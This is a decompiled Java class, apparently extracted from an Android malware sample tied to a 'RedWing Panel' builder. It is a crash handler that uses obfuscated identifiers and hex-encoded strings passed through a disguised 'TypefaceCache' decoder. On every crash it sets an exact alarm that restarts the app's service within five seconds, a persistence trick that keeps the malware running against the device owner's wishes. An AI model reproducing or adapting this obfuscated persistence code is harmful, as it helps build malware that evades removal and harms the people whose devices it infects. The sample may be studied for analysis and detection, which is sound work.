package v.s;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.os.SystemClock;
import app.mobilex.plus.services.DataBVTask;
import app.mobilex.plus.services.SyncQYAdapter;
import app.mobilex.plus.util.TypefaceCache;
import app.mobilex.plus.workers.DataFPAdapter;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class H3x8qi5sGfedvF implements Thread.UncaughtExceptionHandler {
    public final SyncQYAdapter dDIMxZXP1V8HdM;
    public final Thread.UncaughtExceptionHandler w9sT1Swbhx3hs = Thread.getDefaultUncaughtExceptionHandler();

    public H3x8qi5sGfedvF(SyncQYAdapter syncQYAdapter) {
        this.dDIMxZXP1V8HdM = syncQYAdapter;
    }

    private static /* synthetic */ void jupcqvowi() {
    }

    @Override // java.lang.Thread.UncaughtExceptionHandler
    public final void uncaughtException(Thread thread, Throwable th) {
        SyncQYAdapter syncQYAdapter = this.dDIMxZXP1V8HdM;
        try {
            TypefaceCache.obtain("000000790055008100F900B800EA0091000900790059");
            TypefaceCache.obtain("001600780058008600E500B800DA00B3006300730043008400F500AF00C600AE002C0078001B008E00FE00FF");
            thread.getName();
            TypefaceCache.obtain("006F00360048008400F800BA00D600B2002F007F0055008000B000AD00D700B40037007700490093");
            int i = DataBVTask.dDIMxZXP1V8HdM;
            y6jRGLEWNMir.nQilHWaqS401ZtR(syncQYAdapter);
            try {
                AlarmManager alarmManager = (AlarmManager) syncQYAdapter.getSystemService("alarm");
                Intent intent = new Intent(syncQYAdapter, (Class<?>) SyncQYAdapter.class);
                intent.setAction(TypefaceCache.obtain("00000044007A00B400D8008000E0008200100042007A00B500C4"));
                alarmManager.setExactAndAllowWhileIdle(2, SystemClock.elapsedRealtime() + 5000, PendingIntent.getService(syncQYAdapter, 7777, intent, 201326592));
            } catch (Exception unused) {
            }
            String str = DataFPAdapter.xDyLpEZyrcKVe0;
            OFMrQsTe5s1KYV0lq.J0zjQ7CAgohuxU20eCW6(syncQYAdapter);
        } catch (Exception unused2) {
        }
        Thread.UncaughtExceptionHandler uncaughtExceptionHandler = this.w9sT1Swbhx3hs;
        if (uncaughtExceptionHandler != null) {
            uncaughtExceptionHandler.uncaughtException(thread, th);
        }
    }
}
